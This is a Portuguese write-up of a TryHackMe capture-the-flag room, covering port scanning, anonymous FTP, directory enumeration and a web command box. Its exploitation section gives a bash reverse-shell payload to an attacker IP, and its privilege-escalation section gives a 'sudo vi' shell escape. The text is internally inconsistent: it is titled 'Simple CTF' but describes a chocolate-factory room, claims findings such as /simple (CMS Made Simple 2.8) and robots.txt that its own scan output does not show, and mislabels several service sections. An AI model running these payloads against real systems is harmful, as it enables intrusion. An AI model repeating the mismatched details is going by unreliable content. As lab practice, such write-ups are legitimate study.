> [!note]
>
> - **Challenge:** Simple CTF
> - **Dificuldade:** Easy
> - **Plaraforma:** TryHackMe
> - **Link:** https://tryhackme.com/room/easyctf 
> - **Autor:** hi im kvothe

# Writeup

## 1. Etapa de Reconhecimento

### 1.1 Enumeração de Portas

Ao spawnar máquina e receber o endereço IP `<TARGET_IP>` da máquina alvo, foi feito uma enumeração dos serviços que estão hospedados na máquina, por meio do comando:

```bash
nmap -T4 -sS --open 10.66.139.97
```
obtendo o seguinte output

```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-17 18:58 +0000
Nmap scan report for 10.66.139.97
Host is up (0.15s latency).
Not shown: 989 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
100/tcp open  newacct
106/tcp open  pop3pw
109/tcp open  pop2
110/tcp open  pop3
111/tcp open  rpcbind
113/tcp open  ident
119/tcp open  nntp
125/tcp open  locus-map

Nmap done: 1 IP address (1 host up) scanned in 3.36 seconds
```

### 1.2 Servidor FTP

Ao acessar o servidor FTP em modo anônimo, foi possível baixar o arquivo `gum_room.jpg`.

```bash
┌──(kali㉿kali)-[~/Documents/ctfs/thm/chocolate-factory]
└─$ ftp 10.66.139.97 
Connected to 10.66.139.97.
220 (vsFTPd 3.0.5)
Name (10.66.139.97:kali): anonymous
331 Please specify the password.
Password: 

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> ls
229 Entering Extended Passive Mode (|||64626|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
229 Entering Extended Passive Mode (|||39567|)
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
100% |******************************************************************************************************************************************************************************************************************|   203 KiB  165.75 KiB/s    00:00 ETA226 Transfer complete.
208838 bytes received in 00:01 (142.44 KiB/s)
ftp> exit
221 Goodbye.
```
O comando 

```bash
strings gum_room.jpg
```
foi executado para verificar se existe algum código oculto na imagem no formato de texto, mas não se achou nada.
 
### 1.3 Servidor HTTP

Ao realizar uma enumeração de diretórios no servidor HTTP com o comando

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -t 50 -x txt,php,js
```

obtemos o output
```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.139.97/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              js,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 277]
.hta.php             (Status: 403) [Size: 277]
.hta.txt             (Status: 403) [Size: 277]
.hta.js              (Status: 403) [Size: 277]
.htpasswd.php        (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
.htpasswd.txt        (Status: 403) [Size: 277]
.htaccess.txt        (Status: 403) [Size: 277]
.htaccess.js         (Status: 403) [Size: 277]
.htaccess.php        (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
.htpasswd.js         (Status: 403) [Size: 277]
home.php             (Status: 200) [Size: 569]
index.html           (Status: 200) [Size: 1466]
server-status        (Status: 403) [Size: 277]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================

```
descobre-se o endpoint `/simple`, o qual está executando a aplicação **CMS Made Simple** na versão 2.8. Além desse endpoint, foram encontrados os arquivos `robots.txt` e `index.html`, os quais não possuem nenhuma informação relevante.

#### 1.3.1 Endpoint `/home.php`

Ao acessar a página `/home.php`, ganha-se acessa a uma funcionalidade para executar comandos no terminal. Assim, ao executarmos o comando `ls`, a lista dos arquivos dos diretórios é exibida. Um arquivo em particular chamou atenção, o arquivo `key_rev_key`. Ao realizar o comando `cat key_rev_key`, observamos um payload bem estranho com as seguintes linhas inclusas

```
congratulations you have found the key:   b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

### 1.4 Servidor newacc

Ao tentar conectar na porta 100 da máquina alvo pelo comando

```bash
 nc <TARGET_IP> 100
```
 
o seguinte output foi exibido na tela

```bash
"Welcome to chocolate room!! 
    ___  ___  ___  ___  ___.---------------.
  .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
  \|\/ __\/ __\/ __\/ __\/ _:\  |:.  \  \___ \
   \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
    \\/ __\/ __\/ __\/ __\/ __:                \
     \\'\__\'\__\'\__\ \__\'\_;-----------------`
      \\/   \/   \/   \/   \/ :                 |
       \|______________________;________________|

A small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
I hope you wont drown Augustus"
```
### 1.5 Servidor pop3pw

Ao tentar conectar na porta 106 da máquina alvo pelo comando

```bash
 nc <TARGET_IP> 106
```
 
o seguinte output foi exibido na tela

```bash
"Welcome to chocolate room!! 
    ___  ___  ___  ___  ___.---------------.
  .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
  \|\/ __\/ __\/ __\/ __\/ _:\  |:.  \  \___ \
   \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
    \\/ __\/ __\/ __\/ __\/ __:                \
     \\'\__\'\__\'\__\ \__\'\_;-----------------`
      \\/   \/   \/   \/   \/ :                 |
       \|______________________;________________|

A small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
I hope you wont drown Augustus"
```
### 1.6 Servidor newacc

Ao tentar conectar na porta 109 da máquina alvo pelo comando

```bash
 nc <TARGET_IP> 109
```
 
o seguinte output foi exibido na tela

```bash
"Welcome to chocolate room!! 
    ___  ___  ___  ___  ___.---------------.
  .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
  \|\/ __\/ __\/ __\/ __\/ _:\  |:.  \  \___ \
   \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
    \\/ __\/ __\/ __\/ __\/ __:                \
     \\'\__\'\__\'\__\ \__\'\_;-----------------`
      \\/   \/   \/   \/   \/ :                 |
       \|______________________;________________|

A small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
I hope you wont drown Augustus"
```
### 1.7 Servidor newacc

Ao tentar conectar na porta 110 da máquina alvo pelo comando

```bash
 nc <TARGET_IP> 110
```
 
o seguinte output foi exibido na tela

```bash
"Welcome to chocolate room!! 
    ___  ___  ___  ___  ___.---------------.
  .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
  \|\/ __\/ __\/ __\/ __\/ _:\  |:.  \  \___ \
   \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
    \\/ __\/ __\/ __\/ __\/ __:                \
     \\'\__\'\__\'\__\ \__\'\_;-----------------`
      \\/   \/   \/   \/   \/ :                 |
       \|______________________;________________|

A small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
I hope you wont drown Augustus"
```
### 1.8 Servidor newacc

Ao tentar conectar na porta 111 da máquina alvo pelo comando

```bash
 nc <TARGET_IP> 111
```
 
o seguinte output foi exibido na tela

```bash
"Welcome to chocolate room!! 
    ___  ___  ___  ___  ___.---------------.
  .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
  \|\/ __\/ __\/ __\/ __\/ _:\  |:.  \  \___ \
   \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
    \\/ __\/ __\/ __\/ __\/ __:                \
     \\'\__\'\__\'\__\ \__\'\_;-----------------`
      \\/   \/   \/   \/   \/ :                 |
       \|______________________;________________|

A small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
I hope you wont drown Augustus"
```

### 1.9 Servidor newacc

Ao tentar conectar na porta 113 da máquina alvo pelo comando

```bash
 nc <TARGET_IP> 113
```
 
o seguinte output foi exibido na tela

```bash
http://localhost/key_rev_key <- You will find the key here!!!
```

A url mostrada faz menção ao arquivo achado pelo endpoint `/home.php` 

## 2. Etapa de Exploração

Para obter acesso à máquina host, foi feito uma reverse shell na caixa de comando do endpoint `/home.php`. O payload inserido como input foi

```bash
/bin/bash -c 'bash -i >& /dev/tcp/<MY_IP>/1234 0>&1'
```

e o comando 
```bash
nc -lvnp 1234
```

foi executado para aguardar a conexão da shell remota. Uma vez dentro da máquina, ao ler o conteúdo do arquivo `/var/www/html/validate.php`, encontramos uma senha `<PASSWORD>` para o usuário `<USERNAME>` do servidor web.

Além disso, ao navegar até o diretório "/home/<USERNAME>", encontrou-se alguns arquivos interessantes, em particular o arquivo `teleport`, o qual é uma chave privada RSA. Usando essa chave para fazer login via SSH, é possível logar na máquina alvo com o usuário `<USERNAME>` e acessar a flag de usuário no diretório `/home/<USERNAME>`. 

## 3. Escalação de Privilégio

Ao executar o comando `sudo -l`, observa-se que o usuário `<USERNAME>` possui permissão para executar o `vi` como permissões de root. Dessa forma, ao executar `sudo vi -c ':!/bin/sh' /dev/null`, uma shell com permissões de root é aberta. Assim, ao navegar até o diretório `/root`, encontra-se o arquivo `root.py`, o qual quando executado pede para que que a chave seja inserida. Ao fornecer como input a chave encontrada no arquivo `key_rev_key`, a flag de root é printada no terminal.
